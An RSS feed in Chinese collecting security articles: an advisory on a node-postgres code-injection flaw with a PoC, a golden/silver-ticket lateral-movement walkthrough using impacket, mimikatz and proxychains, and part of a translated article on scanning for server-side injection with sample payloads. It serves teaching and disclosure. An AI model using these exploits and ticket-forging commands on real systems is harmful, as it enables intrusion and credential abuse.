+&lt;/code&gt;&lt;p&gt;readyForQuery 让 self._attachListeners 处理连接：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;client.prototype._attachListeners = function (con) {
+  const self = this
+  // rowDescription被触发后，node-postgres将伴随该事件的消息传给handleRowDescription
+  con.on(&#39;rowDescription&#39;, function (msg) {
+    self.activeQuery.handleRowDescription(msg)
+  })
+...
+}
+
+...
+
+Query.prototype.handleRowDescription = function (msg) {
+  this._checkForMultirow()
+  this._result.addFields(msg.fields)           //handleRowDescription又将msg发送给addFields
+  this._accumulateRows = this.callback || !this.listeners(&#39;row&#39;).length
+}
+
+&lt;/code&gt;&lt;p&gt;最终，查询的数据会被传递给 addFields&lt;/p&gt;&lt;p&gt;让我们来看看 addFields 是如何处理参数的：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;Result.prototype.addFields = function (fieldDescriptions) {
+  if (this.fields.length) {
+    this.fields = []
+    this._parsers = []
+  }
+  var ctorBody = &#39;&#39;
+  for (var i = 0; i &amp;lt; fieldDescriptions.length; i++) {
+    var desc = fieldDescriptions[i]
+    this.fields.push(desc)
+    var parser = this._getTypeParser(desc.dataTypeID, desc.format || &#39;text&#39;)
+    this._parsers.push(parser)
+    ctorBody += (fieldName, i) =&amp;gt; {
+      return &quot;\nthis[&#39;&quot; +
+         fieldName.replace(/&#39;/g, &quot;\\&#39;&quot;) + //这个正则表达式只负责过滤SQL注入，它并不会影响我们执行JavaScript
+        &quot;&#39;] = &quot; +
+        &#39;rowData[&#39; + i + &#39;] == null ? null : parsers[&#39; + i + &#39;](rowData[&#39; + i + &#39;]);&#39;
+    }
+  }
+  if (!this.rowAsArray) {
+    this.RowCtor = Function(&#39;parsers&#39;, &#39;rowData&#39;, ctorBody)
+  }
+}
+
+&lt;/code&gt;&lt;p&gt;这个函数将 fieldDescriptions 的数据一一取出，再用inlineParser处理，并把结果保存到 ctorBody 里（这个变量被攻击者变相地控制）。&lt;br&gt;注意!在倒数第二行，ctorBody 被传给 Function ，并将生成的函数对象返回给 RowCtor。&lt;/p&gt;&lt;p&gt;既然都返回了一个函数，那么这个函数肯定会在哪一行被调用。&lt;br&gt;果然，&lt;b&gt;lib/result.js&lt;/b&gt; 会触发该函数：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;...
+Result.prototype.parseRow = function (rowData) {
+  return new this.RowCtor(this._parsers, rowData)
+}
+...
+
+&lt;/code&gt;&lt;p&gt;这样一来，我们可以在 SQL 语句中总包含 JavaScript 来达到任意代码执行。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;PoC&lt;/b&gt;&lt;/h2&gt;&lt;code lang=&quot;js&quot;&gt;const { Client } = require(&#39;pg&#39;)
+const client = new Client()
+client.connect()
+
+const sql = `SELECT 1 AS &quot;\\&#39;/*&quot;, 2 AS &quot;\\&#39;*/\n + console.log(process.env)] = null;\n//&quot;`
+
+client.query(sql, (err, res) =&amp;gt; {
+  client.end()
+})
+
+&lt;/code&gt;&lt;p&gt;这个 PoC 会打印出当前的环境变量，攻击者将 console.log(process.env) 替换成自己的 payload 即可执行任意代码&lt;/p&gt;&lt;h2&gt;&lt;b&gt;漏洞影响&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;如果你不使用用户提供的 SQL 语句连接数据库，这个漏洞就不会影响你。然而，我们 &lt;b&gt;强烈&lt;/b&gt;建议你升级到最新版本。&lt;br&gt;黑客可能会通过以下途径攻击你：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;在你的 SQL 语句中添加恶意表名&lt;/li&gt;&lt;li&gt;让你连接到一个数据库，并让该数据库返回恶意表名&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i&gt;参考：https://github.com/brianc/node-postgres/issues/1408&lt;/i&gt;&lt;/p&gt;</description>
+<author>Twosecurity</author>
+<guid isPermaLink="false">2017-08-17-28575189</guid>
+<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
+</item>
+<item>
+<title>如何通过 SSH 隧道进行域渗透的 PtT 攻击</title>
+<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-06-09-27242393.htm</link>
+<description>&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;如何通过 SSH 隧道进行域渗透的 PtT 攻击&lt;/title&gt;
+&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/27242393&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;&lt;b&gt;前言&lt;/b&gt;&lt;/h2&gt;如果我们在渗透过程中能够拿到用户的 TGT，并能将其导入到内存，那么就可以冒充该用户获得其访问权限，这就是 Pass the ticket（PtT）。PtT 技术使用 Kerberos ticket 来代替明文密码或 NTLM 散列。大多数的 PtT 都用的是 golden ticket 和 silver ticket。通常来说，通过PtT 技术获得一台主机的控制权限是非常容易的，但是通过 ssh隧道的 PtT 攻击技术就较为复杂了。&lt;p&gt;曾经遇到过这样的情况：我们在没有特权 ssh 访问到dmz区中的一台带有内网连接的linux主机的条件下却意外地获得了目标的 krbtgt 和机器账户的 NTLM 散列值。这个网络拓扑大概是这样的：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-aa14c60a63a768f1448b49689262daa4.png_r.jpg&quot; data-rawwidth=&quot;553&quot; data-rawheight=&quot;304&quot;&gt;当我们试图在网络分段的部分对一些敏感的主机进行域内划分的时候，可能就会遇到这种类似的情况，这篇文章我们将着重介绍如何通过 SSH隧道 pass golden ticket 和 silver ticket。作为本文的一个示例，我们将尝试通过位于10.0.10.81的Linux主机来对Windows主机win-rmjbtdb7qtf进行攻击。&lt;p&gt;&lt;br&gt;&lt;b&gt;Golden Tickets&lt;/b&gt;&lt;br&gt;&lt;br&gt;Golen Tickets（伪造的TGT tickets）提供了攻击者一些用以长久化访问域控、在网络中进行跨域访问，以及作为不存在的用户去访问网络资源的方法。想了解Golden Tickets的详细信息的话，可以去看看这个：&lt;a href=&quot;https://adsecurity.org/?p=1640&quot; data-title=&quot;Kerberos Golden&quot; class=&quot;&quot; data-editable=&quot;true&quot;&gt;Kerberos Golden&lt;/a&gt;。攻击者只需要一台安装了&lt;a href=&quot;https://github.com/CoreSecurity/impacket&quot; data-editable=&quot;true&quot; data-title=&quot;impacket&quot;&gt;impacket&lt;/a&gt;和proxychains工具的linux的主机，并且这台主机不需要加入域环境中。&lt;/p&gt;&lt;br&gt;&lt;h2&gt;&lt;b&gt;伪造 ticket&lt;/b&gt;&lt;/h2&gt;要创建一个golden ticket，通常我们需要从目标域获取到以下信息：&lt;br&gt;&lt;ol&gt;&lt;li&gt;krbtgt账户的nt哈希值&lt;br&gt;&lt;/li&gt;&lt;li&gt;目标域的sid&lt;/li&gt;&lt;li&gt;目标域的fqdn(全称域名)&lt;/li&gt;&lt;li&gt;模拟的账户&lt;br&gt;&lt;/li&gt;&lt;/ol&gt;&lt;br&gt;&lt;br&gt;我们将使用impacket的一个样例脚本 &lt;a href=&quot;https://github.com/CoreSecurity/impacket/blob/master/examples/ticketer.py&quot; data-title=&quot;ticketer.py&quot; class=&quot;&quot; data-editable=&quot;true&quot;&gt;ticketer.py&lt;/a&gt;来创建golden tickets的凭证缓存(ccache)文件。下面是为用户mbroda创建ccache文件的语法示例:&lt;br&gt;&lt;code lang=&quot;text&quot;&gt;./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da&lt;/code&gt;&lt;p&gt;为了使impacket的脚本使用ccache文件进行身份验证，而不是提供明文密码或NT哈希，我们需要将KRB5CCNAME变量设置为ccache文件的绝对路径:&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;export KRB5CCNAME=/path/to/ccache/file&lt;/code&gt;&lt;p&gt;验证变量是否设置正确我们使用下面的语句：&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;echo $KRB5CCNAME&lt;/code&gt;&lt;p&gt;现在，我们就可以使用-k参数让支持Kerberos身份验证的impacket脚本使用golden tickets，而不是去提供明文密码或NT哈希来进行身份验证。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;名称解析&lt;/b&gt;&lt;/h2&gt;为了确保Kerberos身份验证过程成功，我们需要修改攻击者机器/etc/hosts文件，以包含目标域控制器的FQDN和目标主机的NetBIOS名称。下面就是个修改的例子：&lt;code lang=&quot;text&quot;&gt;127.0.0.1 localhost
+192.168.26.129 amity.local
+192.168.26.128  WIN-RMJBTDB7QTF&lt;/code&gt;&lt;p&gt;如果你还没有域控主机的IP地址，那么你可以通过ssh会话连接的linux在目标域上之执行nslookup，例如：&lt;/p&gt;&lt;code lang=&quot;bash&quot;&gt;nslookup -type=srv _ldap._tcp.AMITY.LOCAL&lt;/code&gt;&lt;h2&gt;&lt;b&gt;代理设置&lt;/b&gt;&lt;/h2&gt;我们将使用proxychains在ssh通道上来实现一个域内的漫游，检查配置文件的最后一行来验证proxychains代理的端口，kali下配置文件默认位置是/etc/proxychains.conf。&lt;p&gt;注意:如果您在执行攻击时遇到名称解析的问题，您可能需要在proxychains配置文件中对proxydns设置进行注释。&lt;/p&gt;&lt;p&gt;当我们通过ssh会话连接到目标的linux主机的时候，使用-D参数对应着proxychains设置的端口。这将在我们本地主机的端口上创建一个可以利用proxychains实现域内漫游的socks代理。例如：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;ssh unpriv@10.0.10.81 -D 1337&lt;/code&gt;&lt;p&gt;为了验证代理通道的创建是否成功，我们可以通过proxychains代理nmap的TCP扫描方式扫描目标主机的445端口。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;proxychains nmap -sT -Pn -p 445 192.168.26.128&lt;/code&gt;&lt;h2&gt;&lt;b&gt;时间同步&lt;/b&gt;&lt;/h2&gt;如果攻击机的时间比目标域控距离快大约5分钟的话，golden tickets就无法正常的工作。&lt;p&gt;如果真如以上所述，我们可以使用net time来检查目标的时间(下面的第1行)，并在攻击者机器(第2行)上设置时间：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;proxychains net time -S &amp;lt;IP-of-DC&amp;gt;
+proxychains net time set -S &amp;lt;IP-of-DC&amp;gt;&lt;/code&gt;&lt;h2&gt;&lt;b&gt;发起攻击&lt;/b&gt;&lt;/h2&gt;等一切都已准备就绪，我们可以使用任何支持ccache身份验证的工具来攻击目标主机。Impacket的psexec.py就是这样一个工具，运行一下命令后将反弹回一个交互式的CMD：&lt;code lang=&quot;text&quot;&gt;proxychains ./psexec.py mbrody-da@WIN-RMJBTDB7QTF -k -no-pass&lt;/code&gt;&lt;p&gt;如果你在攻击时遇到错误，检查相关的配置，并且使用psexec.py的 -debug参数进行错误排除。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Silver Tickets&lt;/b&gt;&lt;/h2&gt;Silver Tickets(伪造的TGS Tickets)将用户认证为一个在主机上运行的服务，并为攻击者提供隐秘和持久的选项，这些是golden tickets所没有的。更多有关信息可以点击：&lt;a href=&quot;https://adsecurity.org/?p=2011&quot; data-editable=&quot;true&quot; data-title=&quot;文章&quot;&gt;文章&lt;/a&gt;。&lt;p&gt;这次攻击需要一个Linux主机，安装有&lt;a href=&quot;https://github.com/CoreSecurity/impacket&quot; data-editable=&quot;true&quot; data-title=&quot;Impacket&quot;&gt;Impacket&lt;/a&gt;和proxychains，并且还有一台安装了&lt;a href=&quot;https://github.com/gentilkiwi/mimikatz&quot; data-editable=&quot;true&quot; data-title=&quot;Mimikatz&quot;&gt;Mimikatz&lt;/a&gt;和&lt;a href=&quot;https://github.com/gentilkiwi/kekeo&quot; data-editable=&quot;true&quot; data-title=&quot;kekeo&quot;&gt;kekeo&lt;/a&gt;的Windows主机。两个主机都不需要成为域成员。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;伪造 ticket&lt;/b&gt;&lt;/h2&gt;&lt;br&gt;要生成一个silver ticket，我们需要以下信息:&lt;br&gt;&lt;ol&gt;&lt;li&gt;目标主机账户NTLM散列值&lt;br&gt;&lt;/li&gt;&lt;li&gt;目标主机的fqdn&lt;/li&gt;&lt;li&gt;目标服务&lt;/li&gt;&lt;li&gt;目标域的sid&lt;/li&gt;&lt;li&gt;目标域的fqdn&lt;/li&gt;&lt;li&gt;模拟的账户&lt;/li&gt;&lt;/ol&gt;&lt;br&gt;在本例中，我们将通过SMB协议对目标主机进行身份验证，因此我们将使用CIFS服务，有人列出了一份普通的&lt;a href=&quot;https://adsecurity.org/?page_id=183&quot; data-editable=&quot;true&quot; data-title=&quot;spn清单&quot;&gt;spn清单&lt;/a&gt;，这个可以在silver ticket中使用。&lt;br&gt;&lt;br&gt;在这个时候我们就不能用ticketer.py来生成我们的silver ticket。我们在准备好的windows主机上使用mimikatz来生成silver ticket的kirbi文件,接下来使用kekeo来将我们的silver ticket转化为ccache文件。&lt;br&gt;&lt;br&gt;使用Mimikatz的&lt;a href=&quot;https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos&quot; data-editable=&quot;true&quot; data-title=&quot;Kerberos模块&quot;&gt;Kerberos模块&lt;/a&gt;用如下命令生成silver ticket:&lt;code lang=&quot;text&quot;&gt;kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE&lt;/code&gt;&lt;p&gt;下面是为用户mbroda和CIFS服务创建ticket的示例:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;kerberos::golden /user:mbrody-da /domain:amity.local /sid:S-1-5-21-2972629792-1506071460-1188933728 /target:WIN-RMJBTDB7QTF.amity.local /rc4:9f5dc9080322414141c92ff51efb952d /service:cifs&lt;/code&gt;&lt;p&gt;退出mimikatz，并启动kekeo，使用以下语法将kirbi文件转换为ccache文件:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;misc::convert ccaches /path/to/ticket1.kirbi /path/to/ticket2.kirbi ...&lt;/code&gt;&lt;p&gt;拷贝这个ccache文件到攻击的Linux主机。确保在Linux主机上记录这个文件的绝对路径；我们将使用这个路径去设置我们的KRB5CCNAME变量。接下来的工作就全是我们的linux主机完成的了。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;攻击过程&lt;/b&gt;&lt;/h2&gt;剩下的silver ticket攻击设置基本类似于“golden ticket”，但有两个例外。&lt;p&gt;首先，我们需要在/etc/hosts文件中提供目标主机的FQDN，而不是之前的NetBIOS名。对于我们的示例，/etc/hosts文件应该是这样的:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;127.0.0.1 localhost
+192.168.26.129 amity.local
+192.168.26.128  WIN-RMJBTDB7QTF.amity.local&lt;/code&gt;&lt;p&gt;第二个区别是我们需要将我们的攻击机的时间与目标主机同步,silver ticket不需要与我们的目标域控进行通信。&lt;/p&gt;&lt;p&gt;遵循上面的步骤，设置KRB5CCNAME变量，检查proxychains配置，建立SSH隧道做socks代理，并使用nmap验证代理可用。我们现在可以通过目标主机的fqdn使用psexec.py脚本进行攻击了。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;proxychains python psexec.py mbrody-da@WIN-RMJBTDB7QTF.amity.local -k -no-pass&lt;/code&gt;&lt;h2&gt;&lt;b&gt;小结&lt;/b&gt;&lt;/h2&gt;Golden ticket和silver ticket技术为攻击者提供了持续和隐秘的技术，但是都需要向目标主机转发连接来实现这一目的。当攻击者在域渗透时可能发现自己有了一些ssh权限，但是却只能通过Linux主机间接到达目标主机，在这些场景中，可以通过proxychains挂代理通过SSH隧道执行PtT攻击。这篇文章介绍了使用psexec.py在目标主机上发起攻击的情况，其实其他任何支持-k参数的任何有效脚本都可以进行攻击。&lt;p&gt;参考：&lt;a href=&quot;qq://txfile/#&quot; data-title=&quot;https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/&quot; class=&quot;&quot;&gt;https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/&lt;/a&gt;&lt;/p&gt;</description>
+<author>TwoSecurity</author>
+<guid isPermaLink="false">2017-06-09-27242393</guid>
+<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
+</item>
+<item>
+<title>Backslash Powered Scanning</title>
+<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-05-30-27166471.htm</link>
+<description>&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;Backslash Powered Scanning&lt;/title&gt;
+&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/27166471&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;&lt;b&gt;摘要&lt;/b&gt;&lt;/h2&gt;&lt;br&gt;现有的web扫描器通过在某个参数上利用大量特定payload进行测试或者寻找特征来找寻服务端的注入漏洞--几乎像一个杀软。在本文中，作将分享另一种扫描方式的概念和开发过程，这种扫描方式能够发现和确认已知与未知类型的注入漏洞。这种方式从经典的手工检测进化而来，拥有手工测试的众多优势，例如WAF避规，极小的网络痕迹和针对过滤的灵活输入。&lt;br&gt;&lt;br&gt;与以往相同，这种方式依然会设法利用一些对于经验丰富的手工测试者来说十分熟悉的漏洞。作者将通过展示几千个网站的样例来分享一些有趣的发现和教训，并放出一个特定的扫描工具。最后，作者将展示这款工具如何能被继续开发，让你有更多的研究方向。&lt;h2&gt;介绍&lt;/h2&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0f189c008e0e9a61ef8b8f77127f4c0a.png_r.jpg&quot; data-rawwidth=&quot;880&quot; data-rawheight=&quot;843&quot;&gt;&lt;br&gt;web应用程序扫描器被广泛认为是只能识别’low-hanging fruit’（注释:容易摘的果子，形容唾手可得）-- 很明显任何人都能找到的漏洞，这通常是一个公正的判断；与手工测试相比，自动扫描器依赖于大量特定技术的payload，缺乏应变性意味着即使是最先进的扫描器也不能像人类一样识别某些明显的漏洞。在某种意义上，这种比较也是不公平的--扫描器越来越擅长发现客户端的问题，例如跨站点脚本(XSS)，甚至能通过动态与静态分析识别出基于DOM的XSS。然而，黑盒扫描器对服务端的运作缺乏了解，因此他们通常难以检测出服务端的注入漏洞，例如SQL注入，代码注入，命令注入。&lt;p&gt;在这篇文章中，作者将拆分出扫描器对服务端注入漏洞检测的三个核心盲点，接着展示如何实现一个从手工检测进化而来的扫描方式，作者将开发一个开源扫描器能够检测远高于’low-hanging fruit’的漏洞。特别是，作者将展示这个扫描器能够在发现漏洞类之前，检测出服务端的模板注入(SSTI)漏洞。&lt;/p&gt;&lt;p&gt;这个扫描器作为一个Burpsuite的插件能够从BApp store中获取到，源代码也可以从Github中获取到：&lt;a href=&quot;https://github.com/PortSwigger/backslash-powered-scanner&quot; data-title=&quot;backslash-powered-scanner&quot; class=&quot;&quot; data-editable=&quot;true&quot;&gt;backslash-powered-scanner&lt;/a&gt;，&lt;a href=&quot;https://github.com/PortSwigger/distribute-damage&quot; data-editable=&quot;true&quot; data-title=&quot;distribute-damage&quot; class=&quot;&quot;&gt;distribute-damage&lt;/a&gt;&lt;/p&gt;&lt;h2&gt;扫描器的三个薄弱之处&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;&lt;b&gt;盲点一：Rare Technology&lt;/b&gt;&lt;br&gt;&lt;br&gt;通过安全防范扫描仪。举一个例子，来看下模板注入(SSTI)，当应用程序不做防范，将用户输入嵌入到模板中时，即会出现漏洞。根据使用的模板引擎，这可能会被利用，导致任意代码执行甚至完全控制服务器。为了使扫描器能检测到这种漏洞，需要使用到每一种模板引擎的payload硬编码。如果你的应用程序使用的是一个流行模板引擎例如FreeMarker或者Jinja，那没有什么问题。但是你的扫描器能够支持以下多少个模板引擎：&lt;br&gt;&lt;br&gt;&lt;blockquote&gt;&lt;p&gt;Amber, Apache Velocity, action4JAVA, ASP.NET (Microsoft), ASP.NET (Mono), AutoGen, Beard, Blade, Blitz, Casper, CheetahTemplate, Chip Template Engine, Chunk Templates, CL-EMB, CodeCharge Studio, ColdFusion, Cottle, csharptemplates, CTPP, dbPager, Dermis, Django, DTL::Fast (port of Django templates), Djolt-objc, Dwoo, Dylan Server Pages, ECT, eRuby, FigDice, FreeMarker, Genshi (templating language), Go templates, Google-ctemplate, Grantlee Template System, GvTags, H2o, HAH, Haml, Hamlets, Handlebars, Hyperkit PHP/XML Template Engine, Histone template Engine, HTML-TEMPLATE, HTTL, Jade, JavaServer Pages, jin-template, Jinja, Jinja2, JScore, Kalahari, Kid (templating language), Liquid, Lofn, Lucee, Mako, Mars-Templater, MiniTemplator, mTemplate, Mustache, nTPL, Open Power Template, Obyx, Pebble, Outline, pHAML, PHP, PURE Unobtrusive Rendering Engine, pyratemp, QueryTemplates, RainTPL, Razor, Rythm, Scalate, Scurvy, Simphple, Smarty, StampTE, StringTemplate, SUIT Framework, Template Attribute Language, Twital, Template Blocks, Template Toolkit, Thymeleaf, TinyButStrong, Tonic, Toupl, Twig, Twirl, uBook Template, vlibTemplate, WebMacro, ZeniTPL, BabaJS, Rage, PlannerFw, Fenom&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;这个列表只包含了一些在维基百科上众所周知的模板引擎。Michael Stepankin最近发现一个在 paypal 上的远程代码执行漏洞(&lt;a href=&quot;http://artsploit.blogspot.jp/2016/08/pprce2.html&quot; data-editable=&quot;true&quot; data-title=&quot;remote code execution vulnerability in Paypal&quot; class=&quot;&quot;&gt;remote code execution vulnerability in Paypal&lt;/a&gt;),起因于&lt;a href=&quot;https://github.com/linkedin/dustjs&quot; data-editable=&quot;true&quot; data-title=&quot;Dust.js&quot; class=&quot;&quot;&gt;Dust.js&lt;/a&gt; 产生的 SSTI，这个来自 LinkedIn 的模板引擎明显不在上面的列表之中。匮乏的扫描器适用范围同样适用于使用无数数据库语言的用户，更不用说那些超出理解范围的扭曲框架的代码注入。&lt;br&gt;&lt;/p&gt;&lt;p&gt;此外，使扫描器对后端技术进行假设，这意味着改变任何一个服务端组件的改变都会破坏对其余漏洞的检测。例如，在 SELinux 下运行一个 Webapp 能够组织对本地文件包含和外部实体包含漏洞的检测，这些检测通常通过读取 /etc/passwd来验证，而 SELinux 将会阻止这些行为。&lt;/p&gt;&lt;p&gt;最终，扫描器对于使用小众技术的应用程序进行检测时，性能严重下降。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;盲点二：Variants and Filters&lt;/b&gt;&lt;br&gt;&lt;br&gt;利用一个众所周知的语言来思考一个经典的漏洞:在 PHP 双引号中的 blind code injection。扫描器可以通过发送一个 time-delay 的 payload 轻易检测出这个问题：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&quot;.sleep(10).&quot;&lt;/code&gt;&lt;p&gt;到目前还好。但是如果应用程序碰巧过滤了括号，代码将会出错，但是我们仍然可以利用：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&quot;.`sleep 10`.&quot;&lt;/code&gt;&lt;p&gt;如果应用程序的 WAF 检测 payload 是否存在 ’sleep’ 这个关键词，我们几乎可以肯定会再次出错。如果应用程序能正常化输出，那么我们仍然可以通过利用 Cyrillic 的’e’字符，希望能变成正常的’e’从而执行：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&quot;.sl%D0%B5ep(10).&quot;&lt;/code&gt;&lt;p&gt;如果应用程序过滤了双引号，我们会再一次获得错误的结果，但是我们仍然能轻易的执行我们的代码：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;{${sleep(10)}}&lt;/code&gt;&lt;p&gt;这三个例子中，我在渗透测试中遇到过两个，在别人的 Writeup 中看到了第三个。&lt;/p&gt;&lt;p&gt;扫描器的设计使得他们很容易因为意想不到的过滤和变体而检测失败。扫描器当然可以发送上面展示的变体 payload，但是这些仅仅是一个漏洞的众多变体中的三个。发送足够的 payload覆盖每一种的漏洞的每一个变体，在现在的网络速度上基本上是难以置信的 --因为有数百万个 payload。扫描器仅限于发送’best-effort’（注释:尽力而为）的 payload，这意味着即使是使用双引号代替单引号封装 SQL 语句也会导致扫描器的检测失败。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;b&gt;盲点三：Buried Vulnerabilities&lt;/b&gt;&lt;br&gt;&lt;br&gt;下面这个请求是 Ebay 的一个端点上的HTTP请求，以前被用作 PHP 的代码注入，那么扫描器该从何处加载 payload?&lt;code lang=&quot;text&quot;&gt;GET /search/?q=david HTTP/1.1
+Host: sea.ebay.com.sg
+User-Agent: Mozilla/5.0 etc Firefox/49.0
+Accept: text/html
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://sea.ebay.com.sg/
+Cookie: session=pZGFjciI6IjAkLCJlx2V4cCI6MTA4
+Connection: close&lt;/code&gt;&lt;p&gt;很明显的加载地点是参数’q’，但是并没有起作用，同样也不是 Referer，User-Agent 或者是 Session cookie。一个经验丰富的测试者可能会尝试在不曾出现过的 headers 中加载 payload，例如 Origin，X-Forwarded-For 或者是 X-Forwarded Host。这些 headers 没有一个起作用的，而扫描器扫描到这个地步时，已经发送了大量的 payload 且都没有成功，David Vieira-Kurz 发现有可能可以通过传入第二个参数在此端点形成代码注入，通过创建一个服务端的恶意数组&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;GET /search/?q=david&amp;amp;q[1]=sec{${phpinfo()}}&lt;/code&gt;&lt;p&gt;他之所以尝试这种攻击方式时因为参数 q 会引起一个具有拼写检查，关键字过滤的搜索功能，这提供了一个线索表明了服务端会发生一些有趣的事情。在这里，我们再次遇到一个漏洞，即只有扫描器对每个端点可能发送的有效载荷数量没有限制（或者可以说是检测到的拼写检查器），才能检测到。这是一个比较极端的例子，但是其他很少有用的 header 比如 Accept-Language 处的漏洞也很可能被遗漏。&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;br&gt;&lt;h2&gt;&lt;b&gt;另一种扫描方式&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在这一点上你该知道如何让应用程序或多或少的做到防扫描；只需要使用不出名的 web 语言编写代码，将数据与非标准语法的 NoSQL 变体存储在一起，在上面分层覆盖 WAF。&lt;/p&gt;&lt;p&gt;那么手工测试者时如何避开这些盲点的？最根本的区别是他们对于无用、有趣、可疑或者有效输入的概念。David Vieira-Kurz 的观察指出一个具有拼写检查功能的输入点会直接导致他的广泛审计，可能这会在你的正常输入中浪费时间。&lt;/p&gt;&lt;p&gt;我们可以从中学到，相比起扫描漏洞，我们需要的是扫描那些有趣的行为。接着，我们可以进一步调查以确认产生这些有趣行为的极小部分的输入。这种识别漏洞的迭代方法在漏洞确实存在时非常的灵活和高效。不会产生任何有趣行为的输入被快速的忽略掉，为持续调查更有希望的输入节省时间，形成一个部署探针-扫描比对-结果研究的循环：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3de0995ac208e3bdb92f38a0620af4b0.png_r.jpg&quot;&gt;&lt;br&gt;&lt;h2&gt;&lt;b&gt;可疑的输入转换&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;用于探测可疑行为的初始检测应该尽可能的简单和通用。例如如下用于利用 FreeMarker SSTI的 payload：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&amp;gt; ${ex(&quot;id&quot;)}&lt;/code&gt;&lt;p&gt;这可以很轻易的回滚成一个更为通用的 payload 用以检测大多数利用了流行语法的模板引擎：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;${7*7} (expect 49)&lt;/code&gt;&lt;p&gt;如何扩大用于检测通用代码的覆盖范围？作者尝试了如下方法：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;7*7 (expect 49)&lt;/code&gt;&lt;p&gt;但其仅能够适用于数字输入。为了检测字符串的注入，可以这样做：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;\x41 (expect A)&lt;/code&gt;&lt;p&gt;然而很多语言，特别是包括 SQL，并不支持 Hex 转义。那下面这个探针则可以做到更一步的通用，基本支持所有的语言：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;\\ (expect \)&lt;/code&gt;&lt;p&gt;在这一点上作者首先探测出可疑的输入变换。接着进入到扫描阶段的开发过程，在大量的应用程序中尝试这种 payload 看看会发生什么。如果探针是有效的且试验台足够大（稍后讲解），那么将会得到一组适当大小的结果，从而手动调查并从中发现有趣有用的东西。&lt;/p&gt;&lt;p&gt;这种情况下，第一步去理解应用程序的行为是为了寻找出其他的输入变换，例如 \x41=&amp;gt;A。通过对比应用程序对已知的不良字符和其他字符的处理方式，可以获得一些微妙的线索，知道在服务端哪些字符具有特殊的意义。例如，以\zz为基线，可以很轻易的发现异常：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;\zz =&amp;gt; \zz
+
+ \&quot; =&amp;gt; \&quot;
+ \$ =&amp;gt; \$
+ \{ =&amp;gt; {
